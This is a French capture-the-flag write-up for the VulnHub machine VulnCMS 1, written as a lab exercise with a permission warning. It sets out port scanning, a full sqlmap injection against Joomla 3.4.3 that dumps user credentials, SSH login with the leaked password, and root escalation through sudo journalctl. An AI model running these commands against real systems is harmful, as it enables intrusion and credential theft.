---
title: "CTF VulnCMS: 1"
date: 2021-06-19
tags: ["Pentest", "CTF", "joomscan", "sqlmap"]
download: https://www.vulnhub.com/entry/vulncms-1,710
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.2** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.26`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir VulnCMS1 && cd VulnCMS1`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -A -p- $IP -oN nmap.txt
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8c:9f:7e:78:82:ef:76:f6:26:23:c9:52:6d:aa:fe:d0 (RSA)
|   256 2a:e2:f6:d2:52:1c:c1:d0:3d:aa:40:e6:b5:08:1d:45 (ECDSA)
|_  256 fa:c9:eb:58:e3:d2:b7:4a:74:77:fc:69:0e:b6:68:08 (ED25519)
80/tcp   open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: W3.CSS Template
5000/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-generator: WordPress 5.7.2
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: fsociety &#8211; Just another WordPress site
8081/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Home
9001/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: fsociety.web
```

On a un serveur **SSH** sur le port **22** puis 4 serveurs **Nginx** 1.14.0 sur 4 ports différents : **80**, **5000** (**Wordpress** 5.7.2), **8001** (**Joomla**) et **9001** (**Drupal** 7).

On examine le premier site avec **Nikto**.

```bash
$ nikto -h http://$IP -o nikto_default.txt
+ Server: nginx/1.14.0 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '' in robots.txt returned a non-forbidden or redirect HTTP code (200)
```

On vérifie ce que contient le fichier "robots.txt".

```txt
User-agent: *

Disallowed:
/home.html
/about.html
```

Ces 2 pages n'apportent rien de nouveau donc on examine le second site, celui sous **Wordpress** avec **Nikto**.

```bash
$ nikto -h http://$IP:5000 -o nikto_WP.txt
+ Server: nginx/1.14.0 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: http://192.168.1.26:5000/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'link' found, with contents: <http://fsociety.web:5000/wp-json/>; rel="https://api.w.org/"
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /wp-content/plugins/hello.php: PHP error reveals file system path.
+ OSVDB-62684: /wp-content/plugins/hello.php: The WordPress hello.php plugin reveals a file system path
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login.php: Wordpress login found
```

```bash
$ wpscan --url http://$IP:5000 -e u
[i] User(s) Identified:

[+] wordpress_admin
```

En tentant le brute force avec l'utilisateur "wordpress_admin" `wpscan --url http://$IP:5000 -U wordpress_admin -P /usr/share/wordlists/rockyou.txt`, ça ne mène à rien...

On poursuit en examinant le troisième site, avec le second CMS **Joomla** avec **Nikto**.

```bash
$ nikto -h http://$IP:8081 -o nikto_Joomla.txt
+ Server: nginx/1.14.0 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/bin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/libraries/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/logs/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 14 entries which should be manually viewed.
+ OSVDB-8193: /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
+ OSVDB-3092: /administrator/: This might be interesting...
+ OSVDB-3092: /bin/: This might be interesting...
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3092: /logs/: This might be interesting...
+ OSVDB-3092: /tmp/: This might be interesting...
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
+ /administrator/index.php: Admin login page/section found.
+ 8742 requests: 0 error(s) and 26 item(s) reported on remote host
```

Pour trouver la version de **Joomla** utilisée, on va se servir de l'outil d'analyse **joomscan**. On le récupère depuis son repo Git `git clone https://github.com/rezasp/joomscan.git && cd joomscan` afin de lancer le scan.

```bash
$ perl joomscan.pl -u http://$IP:8081
[+] Detecting Joomla Version
[++] Joomla 3.4.3

[+] Core Joomla Vulnerability
[++] Joomla! 3.2.x < 3.4.4 - SQL Injection
EDB : https://www.exploit-db.com/exploits/38534/
[...]
```

On trouve la version de **Joomla**: 3.4.3 ainsi que les failles associées. C'est la première qui nous intéresse car c'est une injection SQL. Pour ce faire, on va utiliser l'outil **SQLMap**.  
Dans un premier temps, on récupère les bases de données utilisées.

```bash
$ sqlmap -u 'http://'$IP':8081/index.php?option=com_contenthistory&view=history&item_id=1&type_id=1&list[select]=*' --tamper=apostrophemask --technique=E --dbs
available databases [2]:
[*] information_schema
[*] joomla_db
```

La base de données qui nous intéresse est la seconde "joomla_db".  
Puis dans un second temps, on récupère la liste des tables.

```bash
$ sqlmap -u 'http://'$IP'8081/index.php?option=com_contenthistory&view=history&item_id=1&type_id=1&list[select]=*' --tamper=apostrophemask --technique=E -D joomla_db -T users --tables --dump 
[...]
+-------------------------------+
| hs23w_usergroups              |
| hs23w_users                   |
| hs23w_viewlevels              |
+-------------------------------+
```

On a une liste de tables préfixées par "hs23w_". Celle qui nous intéresse est la "hs23w_users".  
Et ensuite, dans un troisième et dernier temps, on récupère la liste des utilisateurs.

```bash
$ sqlmap -u 'http://'$IP':8081/index.php?option=com_contenthistory&view=history&item_id=1&type_id=1&list[select]=*' --tamper=apostrophemask --technique=E -D joomla_db -T hs23w_users --dump
Database: joomla_db
Table: hs23w_users
[2 entries]
+----+------------+---------+-------+-------------------------+---------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+
| id | name       | otep    | block | email                   | otpKey  | params                                                                                       | password                                                     | username        | sendEmail | activation | resetCount | registerDate        | requireReset | lastResetTime       | lastvisitDate       |
+----+------------+---------+-------+-------------------------+---------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+
| 46 | Super User | <blank> | 0     | Fluntence54@armyspy.com | <blank> | <blank>                                                                                      | $2y$10$EYc6SKfMLzlLE/IcD9a6XeAe2Uv7WTBFlbbqRrnpht1K0M1bLrWee | joomlaCMS_admin | 1         | 0          | 0          | 2021-05-29 10:08:24 | 0            | 0000-00-00 00:00:00 | 2021-05-31 09:14:41 |
| 47 | elliot     | <blank> | 1     | 5T3e!_M0un7i@N          | <blank> | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} | $2y$10$jddnEQpjriJX9jPxh6C/hOag4ZZXae4iVhL7GVRPC9SHWgqbi4SYy | elliot          | 0         | <blank>    | 0          | 2021-05-31 09:16:30 | 0            | 0000-00-00 00:00:00 | 0000-00-00 00:00:00 |
+----+------------+---------+-------+-------------------------+---------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+
```

On a un utilisateur "elliot" avec ce qui semblerait être un mot de passe "5T3e!_M0un7i@N" dans le champ "email".

## Pénétration

On se connecte au serveur **SSH** avec ce compte.

```bash
$ ssh elliot@$IP
password: 5T3e!_M0un7i@N
```

Et on trouve le premier flag.

```bash
$ cat user.txt
9046628504775551
```

## Escalation

Vous remarquez que la commande `cd` n'est pas disponible. Déconnectez-vous de SSH et reconnectez-vous avec la commande suivante `ssh elliot@$IP -t "bash --noprofile"`.

En farfouillant dans le dossier de l'application **Drupal**, on tombe sur un fichier intéressant...

```bash
$ cat /var/www/html/drupal/misc/tyrell.pass
Username: tyrell
Password: mR_R0bo7_i5_R3@!_
```

On a trouvé le mot de passe de l'utilisateur "tyrell".

```bash
$ su tyrell
password: mR_R0bo7_i5_R3@!_
```

Cet utilisateur a le privilège root sur la commande `journalctl`.

```bash
$ sudo -l
Matching Defaults entries for tyrell on vuln_cms:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tyrell may run the following commands on vuln_cms:
    (root) NOPASSWD: /bin/journalctl
```

On cherche la commande à exécuter sur [GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/#sudo).

```bash
$ sudo journalctl
$ /bin/sh
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Ainsi, on trouve le second et dernier flag.

```bash
$ cat /root/root.txt
4359537020406305
```
